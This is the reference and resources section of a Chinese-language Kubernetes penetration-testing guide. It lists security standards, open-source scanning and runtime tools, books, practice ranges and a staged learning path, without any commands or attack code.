### 11.1 标准与规范

| 标准名称 | 发布机构 | 主要内容 |
|---------|---------|---------|
| CIS Kubernetes Benchmark | CIS | K8s安全配置基准 |
| NSA Kubernetes Hardening | NSA | K8s加固指南 |
| OWASP Kubernetes Top 10 | OWASP | K8s十大安全风险 |
| NIST SP 800-190 | NIST | 应用容器安全指南 |
| MITRE ATT&CK Container | MITRE | 容器攻击矩阵 |

### 11.2 工具清单汇总

#### 11.2.1 渗透测试工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| kube-hunter | K8s渗透测试扫描 | 开源 |
| Metasploit Framework | 渗透测试框架 | 开源 |
| nmap | 端口扫描 | 开源 |
| kubectl | K8s命令行工具 | 开源 |
| etcdctl | etcd命令行工具 | 开源 |
| amicontained | 容器环境检测 | 开源 |

#### 11.2.2 安全审计工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| kube-bench | CIS Benchmark检查 | 开源 |
| kubescape | 多框架合规检查 | 开源 |
| kubeaudit | K8s安全审计 | 开源 |
| Popeye | 集群健康检查 | 开源 |
| trivy | 漏洞与配置扫描 | 开源 |

#### 11.2.3 运行时安全工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| Falco | 运行时威胁检测 | 开源 |
| Tracee | eBPF运行时安全 | 开源 |
| Sysdig Falco | 容器运行时监控 | 开源/商业 |

#### 11.2.4 镜像安全工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| trivy | 镜像漏洞扫描 | 开源 |
| Clair | 镜像漏洞扫描 | 开源 |
| Grype | 镜像漏洞扫描 | 开源 |
| Docker Bench | Docker安全检查 | 开源 |

### 11.3 学习资源

#### 11.3.1 官方文档

- Kubernetes官方文档：https://kubernetes.io/docs/
- Kubernetes安全文档：https://kubernetes.io/docs/concepts/security/
- CIS Benchmark：https://www.cisecurity.org/benchmark/kubernetes
- NSA Kubernetes Hardening Guide：https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/

#### 11.3.2 书籍推荐

- 《Kubernetes Security and Observability》- Bich Le, Andrew Martin
- 《Container Security》- Liz Rice
- 《Kubernetes in Production》- Justin Domingus, John Arundel
- 《Hacking Kubernetes》- Andrew Martin, Michael Hausenblas
- 《云原生安全》- 叶鹏、等

#### 11.3.3 CTF与靶场

- **Kubernetes Goat**：故意设计的不安全K8s集群，用于学习
- **k8s-attack-range**：K8s攻击靶场
- **Kubernetes Security Bootcamp**：K8s安全训练营
- **Hack The Box**：包含K8s相关的靶机
- **Vulhub**：包含部分K8s漏洞环境

#### 11.3.4 社区与博客

- Kubernetes官方博客：https://kubernetes.io/blog/
- Aqua Security博客：https://blog.aquasec.com/
- ARMO博客：https://www.armosec.io/blog/
- SANS云安全博客：https://www.sans.org/blog/
- OWASP Kubernetes Top 10：https://owasp.org/www-project-kubernetes-top-ten/

### 11.4 学习路径建议

**初级阶段（1-2个月）：**
1. 掌握K8s基本概念和操作
2. 熟悉kubectl常用命令
3. 了解K8s各组件功能
4. 部署和使用minikube/kind

**中级阶段（2-4个月）：**
1. 学习K8s安全架构
2. 掌握RBAC配置
3. 熟悉常见漏洞和攻击面
4. 学会使用安全扫描工具
5. 完成Kubernetes Goat等靶场

**高级阶段（4-6个月）：**
1. 深入研究容器逃逸技术
2. 掌握K8s渗透测试方法论
3. 学习红蓝对抗技术
4. 研究K8s内核漏洞利用
5. 参与CTF和实战演练

---

> **本章小结**：Kubernetes渗透测试是云安全领域的重要分支。本章从安全架构出发，系统介绍了K8s渗透测试的完整方法论，包括信息收集、权限获取、横向移动、权限提升、持久化等各个阶段，详细讲解了常见漏洞利用技术和工具链，并通过三个实战案例帮助读者建立实战思维。建议读者结合靶场环境进行实践，不断提升K8s安全攻防能力。
